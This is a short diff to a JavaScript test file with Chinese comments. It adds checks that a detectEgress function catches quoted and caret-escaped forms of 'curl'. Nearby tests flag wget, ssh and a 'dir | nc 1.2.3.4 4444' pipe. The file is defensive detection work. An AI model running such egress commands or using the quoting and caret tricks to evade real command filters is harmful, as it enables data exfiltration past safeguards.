@@ -43,6 +43,8 @@ writeFileSync(
 // 1. detectEgress 检测
 console.log("▶ detectEgress 检测");
 check("curl 命中", detectEgress("curl -s https://example.com") === "curl");
+check("引号 curl 命中", detectEgress('"curl" -s https://example.com') === "curl");
+check("caret 转义 curl 命中", detectEgress("c^url -s https://example.com") === "curl");
 check("wget 命中", detectEgress("wget http://x/file") === "wget");
 check("nc 命中（管道后）", detectEgress("dir | nc 1.2.3.4 4444") === "nc");
 check("ssh 命中", detectEgress("ssh user@host") === "ssh");
